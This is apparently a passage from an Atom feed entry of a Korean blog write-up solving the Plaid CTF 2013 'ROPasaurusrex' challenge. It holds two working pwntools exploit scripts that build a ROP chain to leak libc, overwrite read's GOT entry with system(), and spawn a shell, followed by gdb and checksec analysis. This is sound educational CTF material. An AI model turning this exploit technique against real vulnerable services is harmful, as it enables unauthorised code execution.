&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pppr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# input &quot;/bin/sh&quot; into bss
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pppr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# got overwrite : read() -&amp;gt; system()
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pppr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# call func ( system(&quot;/bin/sh&quot;) )
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dummy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# recv read_addr (leak)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;read_addr : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# calc system_addr
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_system_offset&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;system_addr : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# send &quot;/bin/sh&quot;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# send system_addr
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/plaid_ctf_2013/ROPasaurusrex/image-20180826232159051.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;다음은 위 ex코드를 pwntool에 어마무시한 기능들로 다 때려박은 코드이다.&lt;/p&gt;

&lt;p&gt;물론 아래 코드가 훨씬 간편하고 쉽겠지만, 기본 개념들을 익히기 위해서 위코드를 먼저 확실히 이해하고 tool의 기능들을 사용하는 것이 독약이 안되는 길이다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# prepare to exploit
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;binsh_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#p = process('./rop')
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./rop'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;c1&quot;&gt;# read read_got leak
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'read'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# input &quot;/bin/sh&quot; into bss
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binsh_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# got overwrite : read() -&amp;gt; system()
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'read'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# call func ( system(&quot;/bin/sh&quot;) )
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# recv read_addr (leak)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]read_addr : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# calc system_addr
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'read'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]system_addr : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# send &quot;/bin/sh&quot;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# send system_addr
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="ROPasaurusrex" /><category term="Plaid CTF 2013" /><category term="Write-up" /><summary type="html">0x01. Static Analysis root@kali:~/Desktop/BoB7/study# checksec ropasaurusrex [*] '/root/Desktop/BoB7/study/ropasaurusrex' Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 바이너리 다운 주소 : http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/ 보호기법은 NX만 설정되어 있다. stack에서 실행 불가능 하다.(쉘코드로 공격 불가능) root@kali:~/Desktop/BoB7/study# file ropasaurusrex ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped dynamic link로 공유라이브러리를 사용하고 있으며, strip되어 있어 심볼이 없다. 0x02. Dynamic Analysis ssize_t __cdecl main() { input(); return write(1, &quot;WIN\n&quot;, 4u); } main함수에는 input함수를 호출하고 return 하는 과정에서 write 함수를 호출한다. (input은 필자가 수정한 이름) ssize_t input() { char buf; // [esp+10h] [ebp-88h] return read(0, &amp;amp;buf, 0x100u); } input함수에는 buf를 선언하고 read함수를 통해 stdin에서 100byte만큼 읽어들여 buf에 저장하는데, buf의 크기는 0x88(136)바이트인데, 0x100(256)바이트 만큼 저장하기 때문에 BoF가 발생한다. ssize_t read(int fd, void *buf, size_t nbytes) fd : 파일 디스크립터 void *buf : 파일을 읽어 들일 버퍼 size_t nbytes : 버퍼의 크기 return : 정상적으로 실행되었다면 읽어들인 바이트 수를 리턴, 실패시 -1을 반환 ssize_t write(int fd, const void *buf, size_t n) { return write(fd, buf, n); } ssize_t write (int fd, const void *buf, size_t n) fd : 파일 디스크립터 void *buf : 파일에 쓰기를 할 내용을 담은 버퍼 size_t n : 쓰기할 바이트 개수 return : 정상적 쓰기를 했다면 쓰기 한 바이트 수, 실패시 -1 main함수에서 fd값으로 1(stdout), buf값으로 “WIN\n”, size값으로 4를 넣어주었으로 화면에 “WIN”이 출력된다.. root@kali:~/Desktop/BoB7/study# ./ropasaurusrex Hello WIN 0x03. Prepare Exploit BoF취약점을 찾았으므로, read함수를 통해 해당 함수의 ret를 덮을 수 있다. NT Bit가 설정되어 있으므로 스택에서 쉘코드를 실행 할 수 없다. 프로그램 내부에서 system함수를 사용하지 않는다. 위 조건으로 살펴보았을 때, ROP기법으로 문제를 풀어 나가면 될것 같다. 우리가 알고 있는 것은 read(), write()함수 이므로 두 함수를 이용하여 Libc주소를 leak하고, 그를 이용하여 system함수의 주소를 구해서 system('/bin/sh')를 실행 시키면 될 것 같다. exploit을 하기 위해 필요한 준비물은 read@plt 주소 read@got 주소 write@plt 주소 write@got 주소 pop-pop-pop-ret 가젯 주소 system함수 offset “/bin/sh” 문자열 저장할 주소 root@kali:~/Desktop/BoB7/study# gdb -q ./ropasaurusrex Reading symbols from ./ropasaurusrex...(no debugging symbols found)...done. gdb-peda$ disas main No symbol table is loaded. Use the &quot;file&quot; command. 모든 심볼이 날아갔으므로 disas main 명령어가 먹히지 않는다. 따라서, 직접 main의 주소를 찾아야 한다. gdb-peda$ info file Symbols from &quot;/root/Desktop/BoB7/study/ropasaurusrex&quot;. Local exec file: `/root/Desktop/BoB7/study/ropasaurusrex', file type elf32-i386. Entry point: 0x8048340 0x08048114 - 0x08048127 is .interp 0x08048128 - 0x08048148 is .note.ABI-tag 0x08048148 - 0x0804816c is .note.gnu.build-id 0x0804816c - 0x08048198 is .hash 0x08048198 - 0x080481b8 is .gnu.hash --- 생략 --- gdb 안에서 info file 명령어를 통해 Entry point(0x8048340)를 알아낸다. gdb-peda$ x/16i 0x8048340 0x8048340: xor ebp,ebp 0x8048342: pop esi 0x8048343: mov ecx,esp 0x8048345: and esp,0xfffffff0 0x8048348: push eax 0x8048349: push esp 0x804834a: push edx 0x804834b: push 0x8048450 0x8048350: push 0x8048460 0x8048355: push ecx 0x8048356: push esi 0x8048357: push 0x804841d 0x804835c: call 0x804831c &amp;lt;__libc_start_main@plt&amp;gt; 0x8048361: hlt 0x8048362: nop 0x8048363: nop Entry point에 instruction 을 보면 _libc_start_main@plt 를 호출하는 함수가 보인다. 이때 들어가는 마지막 push 값(“0x804841d”) 이 main함수의 주소가 된다. main : 0x0804841d gdb-peda$ x/16i 0x804841d 0x804841d: push ebp 0x804841e: mov ebp,esp 0x8048420: and esp,0xfffffff0 0x8048423: sub esp,0x10 0x8048426: call 0x80483f4 0x804842b: mov DWORD PTR [esp+0x8],0x4 0x8048433: mov DWORD PTR [esp+0x4],0x8048510 0x804843b: mov DWORD PTR [esp],0x1 0x8048442: call 0x804830c &amp;lt;write@plt&amp;gt; 0x8048447: leave 0x8048448: ret ssize_t __cdecl main() { input(); return write(1, &quot;WIN\n&quot;, 4u); } 소스코드와 비교하여 봤을 때, main함수에서 첫번째로 call 하는 곳이 input함수, 두번째가 write@plt가 된다. write@plt : 0x804830c write@plt를 따라가보면 gdb-peda$ x/3i 0x804830c 0x804830c &amp;lt;write@plt&amp;gt;: jmp DWORD PTR ds:0x8049614 0x8048312 &amp;lt;write@plt+6&amp;gt;: push 0x8 0x8048317 &amp;lt;write@plt+11&amp;gt;: jmp 0x80482ec write@plt에서 jmp하는 주소가 write@got주소가 된다. write@got : 0x8049614 gdb-peda$ x/32i 0x080483f4 0x80483f4: push ebp 0x80483f5: mov ebp,esp 0x80483f7: sub esp,0x98 0x80483fd: mov DWORD PTR [esp+0x8],0x100 0x8048405: lea eax,[ebp-0x88] 0x804840b: mov DWORD PTR [esp+0x4],eax 0x804840f: mov DWORD PTR [esp],0x0 0x8048416: call 0x804832c &amp;lt;read@plt&amp;gt; 0x804841b: leave 0x804841c: ret input 함수 내부이다. read@plt : 0x804832c gdb-peda$ x/3i 0x804832c 0x804832c &amp;lt;read@plt&amp;gt;: jmp DWORD PTR ds:0x804961c 0x8048332 &amp;lt;read@plt+6&amp;gt;: push 0x18 0x8048337 &amp;lt;read@plt+11&amp;gt;: jmp 0x80482ec read@got : 0x804961c 이제 “/bin/sh” 문자열을 넣을 공간을 찾아야 하는데, 제일 만만한 곳이 bss영역이다. root@ubuntu ~/study# objdump -h ropasaurusrex | grep bss 24 .bss 00000008 08049628 08049628 00000628 2**2 bss주소 : 0x08049628 위에서 구한것들을 정리해보면, write@plt : 0x804830c write@got : 0x8049614 read@plt : 0x804832c read@got : 0x804961c bss주소 : 0x08049628 위 정보를 다른 방법으로 구하는 방법. 이제 pop-pop-pop-ret 가젯만 구하면 된다. ropper를 이용하여 가젯을 구하면 쉽지만, ropper가 없는 환경 일 수 있으니 objdump로 구하는 방법을 소개하겠다. 위에서 나온 가젯들 